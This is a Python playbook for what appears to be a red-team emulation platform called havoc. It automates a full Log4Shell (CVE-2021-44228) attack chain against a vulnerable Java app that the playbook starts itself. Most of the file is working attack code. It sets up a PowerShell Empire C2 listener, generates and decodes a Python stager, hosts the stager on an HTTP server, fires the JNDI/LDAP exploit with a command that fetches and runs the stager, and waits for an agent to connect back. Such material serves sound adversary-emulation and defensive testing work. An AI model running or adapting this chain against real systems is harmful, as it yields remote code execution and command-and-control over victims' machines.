# Import the supporting Python packages.
import re
import os
import sys
import json
import string
import random
import pprint
import time as t
import argparse
import subprocess
from configparser import ConfigParser
from datetime import datetime

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - cve-2021-44228 exploit and C2')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/cve_2021_44228_exploit_and_c2/cve_2021_44228_exploit_and_c2.ini')

c2_listener_type = config.get('c2_task', 'listener_type')
c2_listener_profile = config.get('c2_task', 'listener_profile')
c2_listener_port = config.get('c2_task', 'listener_port')
c2_listener_tls = config.get('c2_task', 'listener_tls')
c2_domain_name = config.get('c2_task', 'domain_name')
c2_cert_subj = config.get('c2_task', 'cert_subj')
c2_stager_file = config.get('c2_task', 'stager_file')
http_server_port = config.get('http_server_task', 'http_port')
http_server_ssl = config.get('http_server_task', 'ssl')
http_server_domain_name = config.get('http_server_task', 'domain_name')
exploiter_http_port = config.get('cve_2021_44228_exploit_task', 'http_port')
exploiter_ldap_port = config.get('cve_2021_44228_exploit_task', 'ldap_port')
exploiter_domain_name = config.get('cve_2021_44228_exploit_task', 'domain_name')
exploiter_exec_cmd = config.get('cve_2021_44228_exploit_task', 'exec_cmd')
cve_2021_44228_app_task_name = config.get('remote_cve_2021_44228_app_task', 'task_name')
cve_2021_44228_app_java_version = config.get('remote_cve_2021_44228_app_task', 'java_version')
cve_2021_44228_app_target_port = config.get('remote_cve_2021_44228_app_task', 'target_port')

if c2_listener_profile != 'None':
    resource_name = c2_listener_profile
else:
    resource_name = f'c2-{c2_listener_type}'

# These vars will be used by the clean_up function to determine what components need to be removed. Each operation that
# creates one of the below resources will set the var to the resource name to be used in the clean up operation.
http_server_exists = False
http_portgroup_exists = False
exploiter_exists = False
exploiter_portgroup_exists = False
c2_listener_exists = False
c2_portgroup_exists = False
stager_exists = False
cve_exists = False
agent_exists = False
clean_up_initiated = False


def get_task_attack_ip(tn):
    task_details = h.get_task(tn)
    task_attack_ip = task_details['attack_ip']
    return task_attack_ip


def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


# Poll the task_details until the task's status 'idle'.
def get_task_status(tn):
    task_status = None
    task_details = None
    while task_status != 'idle':
        t.sleep(5)
        task_details = h.get_task(tn)
        task_status = task_details['task_status']
    print(f'\n{tn} is ready:')
    pp.pprint(task_details)
    return task_details


# A 'while loop' can be used to continually pull the results queue until the command results are returned.
def get_command_results(tn, ic, ii, print_output=True):
    results = []
    command_finished = None
    try:
        while not command_finished:
            command_results = h.get_task_results(tn)
            for entry in command_results['queue']:
                if entry['instruct_command'] == ic and entry['instruct_instance'] == ii:
                    command_finished = True
                    if print_output:
                        print(f'\n{tn} {ic} results:')
                        pp.pprint(entry)
                    results.append(entry)
            if not command_finished:
                t.sleep(5)
    except KeyboardInterrupt:
        print('get_command_results interrupted. Initiating clean_up.')
        clean_up()
    return results


def clean_up():
    if http_server_exists:
        print(f'Killing HTTP server on {http_server_exists}')
        instruct_instance = 'clean_up'
        instruct_command = 'terminate'
        h.instruct_task(http_server_exists, instruct_instance, instruct_command)
        command_finished = None
        while not command_finished:
            kill_task_results = h.get_task_results(http_server_exists)
            for entry in kill_task_results['queue']:
                if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
                    print('Task terminated.')
                    command_finished = True
            if not command_finished:
                t.sleep(5)

    if exploiter_exists:
        print(f'Killing exploiter task on {exploiter_exists}')
        instruct_instance = 'clean_up'
        instruct_command = 'terminate'
        h.instruct_task(exploiter_exists, instruct_instance, instruct_command)
        command_finished = None
        while not command_finished:
            kill_task_results = h.get_task_results(exploiter_exists)
            for entry in kill_task_results['queue']:
                if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
                    print('Task terminated.')
                    command_finished = True
            if not command_finished:
                t.sleep(5)

    if agent_exists:
        # Kill the agent.
        print(f'\nKilling agent with name {agent_exists[0]}.')
        instruct_instance = agent_exists[1]
        instruct_command = 'kill_agent'
        agent_name = agent_exists[0]
        instruct_args = {'Name': f'{agent_name}'}
        h.instruct_task(agent_exists[2], instruct_instance, instruct_command, instruct_args)
        # Wait for the agent to shut down.
        t.sleep(5)

    if c2_listener_exists or c2_task_exists:
        # Kill the task.
        print(f'\nKilling task with name {c2_task_exists}.')
        instruct_instance = 'clean_up'
        instruct_command = 'terminate'
        h.instruct_task(c2_task_exists, instruct_instance, instruct_command)
        command_finished = None
        while not command_finished:
            kill_task_results = h.get_task_results(c2_task_exists)
            for entry in kill_task_results['queue']:
                if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
                    print('Task terminated.')
                    command_finished = True
            if not command_finished:
                t.sleep(5)

    if stager_exists:
        # Delete the stager file from the workspace.
        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.')
        h.delete_file(stager_exists)

    if cve_exists:
        # Stop the cve-2021-44228 app.
        print(f'\nStopping the cve-2021-44228 vulnerable app on {cve_exists[0]}.')
        instruct_instance = cve_exists[1]
        instruct_command = 'stop_cve_2021_44228_app'
        h.instruct_task(cve_exists[0], instruct_instance, instruct_command)

    if http_portgroup_exists:
        # Delete the HTTP server portgroup.
        print(f'\nDeleting the {http_portgroup_exists} portgroup.')
        h.delete_portgroup(http_portgroup_exists)

    if exploiter_portgroup_exists:
        # Delete the exploiter portgroup.
        print(f'\nDeleting the {exploiter_portgroup_exists} portgroup.')
        h.delete_portgroup(exploiter_portgroup_exists)

    if c2_portgroup_exists:
        # Delete the c2 portgroup.
        print(f'\nDeleting the {c2_portgroup_exists} portgroup.')
        h.delete_portgroup(c2_portgroup_exists)

    # All done.
    sys.exit('\nDone... Exiting.\n')


# Verify cve_2021_44228_app_task_name exists
print(f'\nVerifying that trainman task {cve_2021_44228_app_task_name} exists.')
target_ip = None
task_list = h.list_tasks()
if cve_2021_44228_app_task_name in task_list['tasks']:
    target_ip = get_task_attack_ip(cve_2021_44228_app_task_name)
else:
    sys.exit(f'\nTrainman task {cve_2021_44228_app_task_name} does not exist. Exiting...')

# Create a portgroup for the HTTP server task.
print(f'\nCreating a portgroup for the HTTP server.')
h.create_portgroup('http_server', f'Allows port {http_server_port} traffic')
print(f'\nAdding portgroup rule to allow {cve_2021_44228_app_task_name} task target IP {target_ip} to reach '
      f'port {http_server_port}.\n')
h.update_portgroup_rule('http_server', 'add', f'{target_ip}/32', http_server_port, 'tcp')
http_portgroup_exists = 'http_server'

# Create a portgroup for the exploiter task's HTTP and LDAP ports.
print(f'\nCreating a portgroup for the exploiter task.')
h.create_portgroup('exploiter', f'Allows port {exploiter_http_port} and port {exploiter_ldap_port} traffic')
print(f'\nAdding portgroup rule to allow {cve_2021_44228_app_task_name} task target IP {target_ip} to reach '
      f'port {exploiter_http_port}.\n')
h.update_portgroup_rule('exploiter', 'add', f'{target_ip}/32', exploiter_http_port, 'tcp')
print(f'\nAdding portgroup rule to allow {cve_2021_44228_app_task_name} task target IP {target_ip} to reach '
      f'port {exploiter_ldap_port}.\n')
h.update_portgroup_rule('exploiter', 'add', f'{target_ip}/32', exploiter_ldap_port, 'tcp')
exploiter_portgroup_exists = 'exploiter'

# Create a portgroup for the powershell_empire task's listener.
print(f'\nCreating a portgroup for {resource_name} listener.')
h.create_portgroup(resource_name, f'Allows port {c2_listener_port} traffic')
print(f'\nAdding portgroup rule to allow {cve_2021_44228_app_task_name} task target IP {target_ip} to reach '
      f'{resource_name} listener on port {c2_listener_port}.\n')
h.update_portgroup_rule(resource_name, 'add', f'{target_ip}/32', c2_listener_port, 'tcp')
c2_portgroup_exists = resource_name

# Launch an http_server task.
http_server_task_name = f'http_server_{sdate}'
portgroups = ['http_server']
if http_server_domain_name == 'None':
    http_server_host_name = 'None'
else:
    http_server_host_name = 'www'
print(f'\nLaunching http_server task with name {http_server_task_name}.')
h.run_task(
    http_server_task_name,
    'http_server',
    task_host_name=http_server_host_name,
    task_domain_name=http_server_domain_name,
    portgroups=portgroups
)
http_server_exists = http_server_task_name

# Wait for the http_server task to become ready.
print(f'\nWaiting for http_server task {http_server_task_name} to become ready.')
http_server_task_status = get_task_status(http_server_task_name)
http_server_ip = http_server_task_status['attack_ip']
print(f'\nThe http_server task is ready with the following parameters:')
print(f'\nIP - {http_server_ip}')
print(f'\nHost name - {http_server_host_name}')
print(f'\nDomain name - {http_server_domain_name}')

# Launch an exploiter task.
exploiter_task_name = f'cve_2021_44228_exploiter_{sdate}'
portgroups = ['exploiter']
if exploiter_domain_name == 'None':
    exploiter_task_host_name = 'None'
else:
    exploiter_task_host_name = 'cve-2021-44228-exploiter'
print(f'\nLaunching cve_2021_44228_exploiter task with name {exploiter_task_name}.')
h.run_task(
    exploiter_task_name,
    'trainman',
    task_host_name=exploiter_task_host_name,
    task_domain_name=exploiter_domain_name,
    portgroups=portgroups
)
exploiter_exists = exploiter_task_name

# Wait for the exploiter task to become ready.
print(f'\nWaiting for exploiter task {exploiter_task_name} to become ready.')
exploiter_task_status = get_task_status(exploiter_task_name)
exploiter_ip = exploiter_task_status['attack_ip']
print(f'\nThe exploiter task is ready with the following parameters:')
print(f'\nIP - {exploiter_ip}')
print(f'\nHost name - {exploiter_task_host_name}')
print(f'\nDomain name - {exploiter_domain_name}')

# Launch a powershell_empire task for the listener.
c2_task_name = f'{resource_name}_{sdate}'
portgroups = [resource_name]
if c2_domain_name == 'None':
    c2_task_host_name = 'None'
else:
    c2_task_host_name = resource_name
print(f'\nLaunching powershell_empire task with name {c2_task_name}.')
h.run_task(
    c2_task_name,
    'powershell_empire',
    task_host_name=c2_task_host_name,
    task_domain_name=c2_domain_name,
    portgroups=portgroups
)
c2_task_exists = c2_task_name

# Wait for the powershell_empire task to become ready.
print(f'\nWaiting for powershell_empire task {c2_task_name} to become ready.')
pse_task_status = get_task_status(c2_task_name)
pse_ip = pse_task_status['attack_ip']
print(f'\nThe powershell_empire task is ready with the following parameters:')
print(f'\nIP - {pse_ip}')
print(f'\nHost name - {c2_task_host_name}')
print(f'\nDomain name - {c2_domain_name}')

# Use a random string for the PowerShell Empire instruct_instance.
pse_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested, generate a certificate.
if c2_listener_tls == 'yes':
    subj = None
    if c2_domain_name != 'None':
        subj = re.sub('\$HOST', f'{resource_name}.{c2_domain_name}', c2_cert_subj)
    if c2_domain_name == 'None':
        subj = re.sub('\$HOST', f'{pse_ip}', c2_cert_subj)
    instruct_command = 'cert_gen'
    instruct_args = {'subj': subj}
    h.instruct_task(c2_task_name, pse_instruct_instance, instruct_command, instruct_args)

    # Get the cert_gen command results
    cert_gen_results = get_command_results(c2_task_name, instruct_command, pse_instruct_instance)
    for cg_result in cert_gen_results:
        if cg_result['instruct_command'] == instruct_command and cg_result['instruct_instance'] == pse_instruct_instance:
            instruct_command_output = json.loads(cg_result['instruct_command_output'])
            if instruct_command_output['outcome'] == 'success':
                print('\ncert_gen succeeded.\n')
            else:
                print('\ncert_gen failed... Exiting.\n')
                clean_up()

# Create a listener for the powershell_empire task.
print(f'\nCreating {resource_name} listener on {c2_task_name} task.')
if c2_listener_tls == 'yes':
    c2_listener_protocol = 'https'
else:
    c2_listener_protocol = 'http'
if c2_domain_name != 'None':
    c2_listener_host = f'{c2_listener_protocol}://{resource_name}.{c2_domain_name}:{c2_listener_port}'
else:
    c2_listener_host = f'{c2_listener_protocol}://{pse_ip}:{c2_listener_port}'
instruct_command = 'create_listener'
instruct_args = {
        'listener_type': c2_listener_type,
        'Name': f'{resource_name}',
        'Host': c2_listener_host,
        'Port': c2_listener_port
    }
if c2_listener_type == 'http_malleable' and c2_listener_profile != 'None':
    instruct_args['Profile'] = f'{c2_listener_profile}.profile'
if c2_listener_tls == 'yes':
    instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
h.instruct_task(c2_task_name, pse_instruct_instance, instruct_command, instruct_args)

# Get the create_listener command results.
create_listener_results = get_command_results(c2_task_name, instruct_command, pse_instruct_instance)
for cl_result in create_listener_results:
    if cl_result['instruct_command'] == instruct_command and cl_result['instruct_instance'] == pse_instruct_instance:
        instruct_command_output = json.loads(cl_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\ncreate_listener succeeded.\n')
        else:
            print('\ncreate_listener failed... Exiting.\n')
            clean_up()

# Generate a stager for the listener.
print(f'\nGenerating a stager for the {resource_name} listener.')
instruct_command = 'create_stager'
instruct_args = {
    'Listener': f'{resource_name}',
    'StagerName': 'multi/launcher',
    'Language': 'python',
    'OutFile': f'{c2_stager_file}'
}
h.instruct_task(c2_task_name, pse_instruct_instance, instruct_command, instruct_args)

# Get the create_stager command results.
stager = get_command_results(c2_task_name, instruct_command, pse_instruct_instance)
for s in stager:
    if s['instruct_command'] == instruct_command and s['instruct_instance'] == pse_instruct_instance:
        instruct_command_output = json.loads(s['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\ncreate_stager succeeded.\n')
        else:
            print('\ncreate_stager failed... Exiting.\n')
            clean_up()
output = json.loads(stager[0]['instruct_command_output'])['stager']['multi/launcher']['Output']
subprocess.call(f'echo {output} | base64 -d > {c2_stager_file}', shell=True)

# Upload the stager file to the shared workspace
print('\nUploading the stager file to the shared workspace.')
f = open(f'{c2_stager_file}', 'rb')
raw_file = f.read()
h.create_file(f'{c2_stager_file}', raw_file)
stager_exists = f'{c2_stager_file}'

# Use a random string for the http_server instruct_instance.
http_server_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Make sure there isn't an existing stager file with the same name on the http_server task.
print(f'\nDeleting any existing {c2_stager_file} stager from http_server task {http_server_task_name}.')
instruct_command = 'del'
instruct_args = {'file_name': f'{c2_stager_file}'}
h.instruct_task(http_server_task_name, http_server_instruct_instance, instruct_command, instruct_args)

# Get the del command results.
del_results = get_command_results(http_server_task_name, instruct_command, http_server_instruct_instance)
for del_result in del_results:
    if del_result['instruct_command'] == instruct_command and del_result['instruct_instance'] == http_server_instruct_instance:
        instruct_command_output = json.loads(del_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nFile delete request succeeded.\n')
        else:
            print('\nNo existing file was present. Proceeding...\n')

# Ask the http_server task to sync it's local workspace from the shared workspace.
print(f'\nDownloading stager file from shared workspace to {http_server_task_name} task local workspace.')
instruct_command = 'sync_from_workspace'
h.instruct_task(http_server_task_name, http_server_instruct_instance, instruct_command)

# Get the sync_workspace command results.
sync_workspace_results = get_command_results(http_server_task_name, instruct_command, http_server_instruct_instance)
for sw_result in sync_workspace_results:
    if sw_result['instruct_command'] == instruct_command and sw_result['instruct_instance'] == http_server_instruct_instance:
        instruct_command_output = json.loads(sw_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nsync_from_workspace succeeded.\n')
        else:
            print('\nsync_from_workspace failed... Exiting.\n')
            clean_up()

# Ask the http_server task to start a web service.
print(f'\nStarting a web service on {http_server_task_name}.')
instruct_args = {'listen_port': int(http_server_port), 'ssl': http_server_ssl}
instruct_command = 'start_server'
h.instruct_task(http_server_task_name, http_server_instruct_instance, instruct_command, instruct_args)

# Get the start_server command results.
start_server_results = get_command_results(http_server_task_name, instruct_command, http_server_instruct_instance)
for se_result in start_server_results:
    if se_result['instruct_command'] == instruct_command and se_result['instruct_instance'] == http_server_instruct_instance:
        instruct_command_output = json.loads(se_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nstart_server succeeded.\n')
        else:
            print('\nstart_server failed... Exiting.\n')
            clean_up()

# Use a random string for the cve_2021_44228_app task instruct_instance.
cve_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the cve_2021_44228_app task to start a vulnerable app.
print(f'\nStarting a cve-2021-44228 vulnerable application on {cve_2021_44228_app_task_name}.')
instruct_args = {'java_version': cve_2021_44228_app_java_version, 'listen_port': cve_2021_44228_app_target_port}
instruct_command = 'start_cve_2021_44228_app'
h.instruct_task(cve_2021_44228_app_task_name, cve_instruct_instance, instruct_command, instruct_args)
cve_exists = [cve_2021_44228_app_task_name, cve_instruct_instance]

# Get the start_cve_2021_44228_app command results.
start_cve_results = get_command_results(cve_2021_44228_app_task_name, instruct_command, cve_instruct_instance)
for cv_result in start_cve_results:
    if cv_result['instruct_command'] == instruct_command and cv_result['instruct_instance'] == cve_instruct_instance:
        instruct_command_output = json.loads(cv_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nstart_cve_2021_44228_app succeeded.\n')
        else:
            print('\nstart_cve_2021_44228_app failed... Exiting.\n')
            clean_up()

# Verify that the target IP can be reached by the exploiter task's attack IP.
print(f'Please enter a firewall exception that allows {exploiter_task_name} IP {exploiter_ip} to access '
      f'{cve_2021_44228_app_task_name} IP {target_ip} on port {cve_2021_44228_app_target_port}.')
print('Press enter to proceed.')
input()

# Use a random string for the cve_2021_44228_app task instruct_instance.
exploit_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the exploiter task to execute the exploit against the target IP.
print(f'\nInstructing exploiter task {exploiter_task_name} to execute exploit and launch {c2_stager_file}.')
if http_server_domain_name == 'None':
    http_server_fqdn = http_server_ip
else:
    http_server_fqdn = f'{http_server_host_name}.{http_server_domain_name}'
http_server_insert = re.sub('\$HTTP_SERVER_TASK', http_server_fqdn, exploiter_exec_cmd)
new_exec_cmd = re.sub('\$STAGER_FILE', c2_stager_file, http_server_insert)
if exploiter_task_host_name == 'None':
    callback = exploiter_ip
else:
    callback = f'{exploiter_task_host_name}.{exploiter_domain_name}'
target_url = f'http://{target_ip}:{cve_2021_44228_app_target_port}'
instruct_args = {
    'callback': callback,
    'target_url': target_url,
    'http_port': exploiter_http_port,
    'ldap_port': exploiter_ldap_port,
    'exec_cmd': new_exec_cmd
}
instruct_command = 'exploit_cve_2021_44228'
h.instruct_task(exploiter_task_name, exploit_instruct_instance, instruct_command, instruct_args)

# Get the exploit_cve_2021_44228 command results.
exploit_results = get_command_results(exploiter_task_name, instruct_command, exploit_instruct_instance)
for ex_result in exploit_results:
    if ex_result['instruct_command'] == instruct_command and ex_result['instruct_instance'] == exploit_instruct_instance:
        instruct_command_output = json.loads(ex_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nexploit_cve_2021_44228 request succeeded.\n')
        else:
            print('\nexploit_cve_2021_44228 request failed... Exiting.\n')
            clean_up()

# Use a random string for the agent instruct_instance.
agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

print(f'\nWaiting for an agent connection on task {c2_task_name}.\n')
agents = get_command_results(c2_task_name, 'agent_status_monitor', 'agent_status_monitor')
agent_name = json.loads(agents[0]['instruct_command_output'])['agent_info']['name']
agent_exists = [agent_name, agent_instruct_instance, c2_task_name]

print('\nAn agent is connected. Playbook will halt until prompted to clean up.')
print('\nPress enter to proceed with clean up.')
input()

# Playbook is complete; time to clean up.
print('\nPlaybook operation completed. Cleaning up ./havoc resources.')
clean_up()
